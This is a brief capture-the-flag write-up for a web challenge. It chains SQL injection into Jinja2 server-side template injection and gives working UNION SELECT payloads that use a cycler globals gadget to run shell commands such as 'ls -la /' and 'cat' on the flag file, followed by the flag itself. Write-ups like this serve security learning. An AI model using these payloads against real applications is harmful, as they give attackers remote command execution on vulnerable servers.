1. Register as any user.
2. Hint about SQLI + SSTI
3. Read source code in report will show hidden endpoint `/search`
4. testing sqli `a'or1=1--`
5. testign sqli + ssti   ` ' UNION SELECT '{{3*3*}}--`
Paylaod to list all file then read flag. Otherwise can see how flag build in `/app/init.sh`
```
' UNION SELECT '{{cycler.__init__.__globals__.__builtins__.__import__("os").popen("ls -la /").read()}}'--
' UNION SELECT '{{cycler.__init__.__globals__.__builtins__.__import__("os").popen("cat  /flag-fb2223aae6f23736fd45c3f002fec0a2.txt").read()}}'--
```

Flag: PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY} 

Solved by: amkim13